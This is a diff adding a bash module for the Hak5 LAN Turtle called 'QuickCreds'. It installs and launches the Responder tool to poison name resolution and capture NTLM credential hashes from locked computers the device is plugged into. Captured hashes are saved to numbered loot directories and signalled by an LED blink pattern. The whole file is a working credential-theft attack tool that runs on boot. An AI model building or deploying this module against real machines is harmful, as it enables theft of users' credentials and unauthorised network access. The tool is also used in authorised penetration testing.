@@ -1,0 +1,150 @@
+#!/bin/bash /usr/lib/turtle/turtle_module
+VERSION="1.0"
+DESCRIPTION="Snagging creds from locked machines --Mubix, Room362.com. Implements responder attack and saves creds to numbered directories in /root/loot. Upon capture of NTLM hash the amber LED will repeat a 3 blink pattern. Author: Hak5Darren. Credit: Mubix."
+CONF=/tmp/QuickCreds.form
+
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ITEM_HELP=4}
+: ${DIALOG_ESC=255}
+
+function configure {
+#  dialog --title "QuickCreds" --msgbox "\n\
+# Dependencies will be installed. An Internet connection is required.\n\
+# Upon configuration creds will be saved to /root/loot/ on boot." 9 72
+
+dialog --title "QuickCreds" \
+--yesno "\nInstall dependencies and configure QuickCreds?\n\
+An Internet connection is required for installation.\n" 8 60
+response=$?
+case $response in
+   0) ;;
+   1) exit ;;
+   255) exit ;;
+esac
+
+
+# Check to see if QuickCreds has already been configured
+if [[ -d /root/loot || -s /root/loot/responder.log ]];
+then
+  dialog --title "QuickCreds" --msgbox "\nThe QuickCreds module is already configured.\n\
+Creds are saved to /root/loot.\nEnable this module to attack on boot." 9 72
+  exit 1
+fi
+
+# Check for Internet connection
+ping -q -w 5 -c 1 lanturtle.com &> /dev/null && {
+    :
+} || {
+    dialog --title "QuickCreds" --msgbox "\n\
+The LAN Turtle is currently offline.\nPlease connect the LAN Turtle to the Internet and try again. " 9 72
+    exit 1
+}
+
+# Install dependencies
+opkg update | dialog --progressbox "Updating opkg" 14 72 
+
+if [[ ! $(opkg list-installed | grep git) ]];
+  then
+    opkg install git | dialog --progressbox "Installing dependency git" 14 72
+fi
+
+if [[ ! $(opkg list-installed | grep python-sqlite3) ]];
+  then
+    opkg install python-sqlite3 | dialog --progressbox "Installing dependency python-sqlite3" 14 72
+fi
+
+if [[ ! $(opkg list-installed | grep screen) ]];
+  then
+    opkg install screen | dialog --progressbox "Installing dependency screen" 14 72
+fi
+
+if [[ ! $(opkg list-installed | grep python-openssl) ]];
+  then
+    opkg install python-openssl | dialog --progressbox "Installing dependency python-openssl" 14 72
+fi
+
+if [[ ! $(opkg list-installed | grep coreutils-sleep) ]];
+  then
+    opkg install coreutils-sleep | dialog --progressbox "Installing dependency coreutils-sleep" 14 72
+fi
+
+if [[ ! -d /etc/turtle/Responder || ! -s /etc/turtle/Responder/Responder.py ]];
+then
+  rm -rf /etc/turtle/Responder
+  git clone git://github.com/lgandx/responder /etc/turtle/Responder -q | dialog --progressbox "Installing dependency responder" 14 72
+fi
+
+# Setup loot directory and complete setup
+mkdir /root/loot
+touch /root/loot/responder.log
+
+  dialog --title "QuickCreds" --msgbox "\n\
+Configuration complete. Creds will be saved to /root/loot\n\
+Enable this module to have it start the attack on boot.\n" 9 72
+}
+
+function start {
+echo "QuickCreds started."
+echo "LED 3-blink pattern will repeat upon NTLM hash capture."
+echo "If starting this module from the Turtle Shell menu,"
+echo "press CTRL+C to return."
+
+echo "Starting attack..." >> /root/loot/responder.log
+
+# Remove logs symlink
+rm -rf /etc/turtle/Responder/logs
+
+# Enumerate loot directory
+cd /root/loot
+lastdir=$(ls -d [0-9][0-9][0-9][0-9] | tail -1)
+
+# Create new loot numbered directory
+newdir=$((++lastdir))
+mkdir /root/loot/$(printf "%04u" $newdir)
+
+# Create symlink
+ln -s /root/loot/$(printf "%04u" $newdir) /etc/turtle/Responder/logs
+
+# Stop dnsmasq
+/etc/init.d/dnsmasq stop 1&> /dev/null
+
+# Execute attack
+screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F'
+
+# Blink upon hash capture
+while true; do
+if [ -e /etc/turtle/Responder/logs/*NTLM* ];
+  then 
+    if [[ ! $(cat /root/loot/responder.log | tail -n1) == *"Creds"* ]]
+    then
+      echo "Creds saved!" >> /root/loot/responder.log
+    fi
+    echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
+    /usr/bin/sleep 0.05
+    echo 0 > /sys/class/leds/turtle\:yellow\:system/brightness
+    /usr/bin/sleep 0.05
+    echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
+    /usr/bin/sleep 0.05
+    echo 0 > /sys/class/leds/turtle\:yellow\:system/brightness
+    /usr/bin/sleep 0.05
+    echo 255 > /sys/class/leds/turtle\:yellow\:system/brightness
+    /usr/bin/sleep 0.05
+    echo 0 > /sys/class/leds/turtle\:yellow\:system/brightness
+    /usr/bin/sleep 0.6
+  fi
+sleep 1
+done
+}
+
+function stop {
+  kill $(ps | grep [R]esponder | awk {'print $1'})
+  /etc/init.d/dnsmasq start 1&> /dev/null
+  echo "QuickCreds Stopped"
+}
+
+function status {
+  if ps | grep -w -q [R]esponder.py; then echo "1"; else echo "0"; fi
+}
